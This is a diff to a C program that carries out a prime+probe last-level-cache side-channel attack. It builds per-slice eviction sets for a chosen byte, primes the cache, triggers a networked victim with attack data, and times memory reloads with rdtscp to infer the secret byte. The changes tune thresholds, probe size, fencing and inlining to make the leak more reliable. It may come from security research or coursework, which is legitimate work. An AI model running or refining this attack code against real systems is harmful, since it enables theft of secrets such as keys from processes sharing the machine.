@@ -21,9 +21,9 @@
 
 // prime+probe
 #define ATTACK_RUNS 10000
-#define EVICTION_THRESHOLD 90 // L3 miss 
+#define EVICTION_THRESHOLD 150 // L3 miss 
 #define CACHE_STRIDE 4096
-#define PROBE_SIZE (256 * 1024 * 1024)//(256 * 1024 * 1024)// 256mb
+#define PROBE_SIZE (512 * 1024 * 1024)//(256 * 1024 * 1024)// 256mb
 #define PAGE_COUNT (PROBE_SIZE / HUGE_PAGE_SIZE)
 #define MAX_TIME 500
 #define SLICE_COUNT 6
@@ -68,14 +68,15 @@ int main(int argc, char* argv[]) {
     uint8_t spiking_byte;
 
     int byte_diff[256] = {0};
-    for (int i = 67; i < 70; i++){ // from byte 0x00 - 0xFF
+
+    uint8_t target_byte = strtoul(argv[2], NULL, 0);//(uint8_t)i;
+
+    node_t *slice_sets[SLICE_COUNT];
+    build_slice_sets(target_byte, slice_sets);
+    for (int i = 0; i < 3; i++){ // from byte 0x00 - 0xFF
         int total_diff  = 0;
-
-        uint8_t target_byte = (uint8_t)i;//strtoul(argv[2], NULL, 0);
+       
         printf("\n===== EVICTION COUNT FOR BYTE %x =====\n", target_byte);
-
-        node_t *slice_sets[SLICE_COUNT];
-        build_slice_sets(target_byte, slice_sets);
  
         for (int s = 0; s < SLICE_COUNT; s++){
             int total_slice_diff = 0;
@@ -100,8 +101,7 @@ int main(int argc, char* argv[]) {
                     // = ATTACK =
                     //PRIME
                     prime_cache(probe_arr);
-                    _mm_lfence();
-
+                     
                     // ATTACK
                     send(clientfd, attack_data, strlen(attack_data), 0);
                     recv(clientfd, buf, sizeof(buf), 0);
@@ -129,7 +129,7 @@ int main(int argc, char* argv[]) {
         }
         usleep(0);
     }   
-    byte_histogram(byte_diff);
+    //byte_histogram(byte_diff);
     printf("\nLargest Spike Byte: %x (%d)\n", spiking_byte, max);
 
     close(clientfd);
@@ -167,13 +167,14 @@ void build_slice_sets(uint8_t target_byte, node_t **slice_sets){
 
 // gets tge perfect eviction set to fill the victims set
 void get_slice_sets(node_t **address_pool, node_t **slice_sets){
-    node_t *current_set[PAGE_COUNT];
+    node_t **current_set = malloc(PAGE_COUNT * sizeof(node_t*));
     int current_count  = 0;
 
     int found_slices = 0;
     int pool_size = PAGE_COUNT;
     
     while (found_slices < 6){
+        shuffle(address_pool, pool_size);
         // check if enough addresses still in pool
         if (pool_size < 16) {
             printf("ran out of addresses before finding 6 slices\n");
@@ -298,10 +299,10 @@ int set_slice_exists(node_t **current_set, int found_slices, node_t **slice_sets
 
 int full_test_set(node_t *target, node_t **current_set, int current_count){
     int target_evictions = 0;
-    for (int i = 0; i < 10; i++){ 
+    for (int i = 0; i < 8; i++){ 
         target_evictions += test_set(target, current_set, current_count);
     }
-    if(target_evictions > 3){
+    if(target_evictions >= 4){
         return 1; // target was evicted consistently
     }
     return 0; // target not evicted consistently
@@ -320,7 +321,8 @@ int test_set(node_t *target, node_t **current_set, int current_count){
     prime_cache(head);
     // trigger target
     volatile uint8_t *tmp = (volatile uint8_t *)target;
-    *tmp;
+    *(volatile uint8_t *)target;
+    *(volatile uint8_t *)target;
     _mm_mfence();
 
     //re-prime
@@ -330,7 +332,7 @@ int test_set(node_t *target, node_t **current_set, int current_count){
     unsigned int junk;
     uint64_t t1 = __rdtscp(&junk);
     _mm_lfence();
-    volatile uint8_t dummy = *tmp; 
+    *(volatile uint8_t *)target;
     _mm_lfence();
     uint64_t t2 = __rdtscp(&junk);
 
@@ -351,7 +353,7 @@ int address_in_set(node_t *address, node_t **current_set, int current_count){
 }
 
 // Prime LLC
-void prime_cache(node_t *base_ptr){
+static inline __attribute__((always_inline)) void prime_cache(node_t *base_ptr){
     // loops through pointer array for a byte 8 times
     for(int i = 0; i < 8; i++){
         node_t *current = base_ptr;
@@ -363,23 +365,26 @@ void prime_cache(node_t *base_ptr){
     _mm_mfence();
 }
 
-void check_cache_presence(node_t *base_ptr, int *result){
+static inline __attribute__((always_inline)) void check_cache_presence(node_t *base_ptr, int *result){
     unsigned int pid;
     node_t *current = base_ptr;
     int evictions = 0;
     
     while (current != NULL){
+        _mm_lfence();
         uint64_t t1 = __rdtscp(&pid);
         _mm_lfence();
+
         volatile uint8_t tmp = *(volatile uint8_t *)current;
+
         _mm_lfence();
         uint64_t t2 = __rdtscp(&pid);
-        
-        if ((t2 - t1) > c_threshold){
+        _mm_lfence();
+
+        if ((t2 - t1) > c_threshold && (t2 - t1) < MAX_TIME){
             evictions++;
         }
         current = current->next;
-        _mm_lfence();
     }
     
     (*result) += evictions;
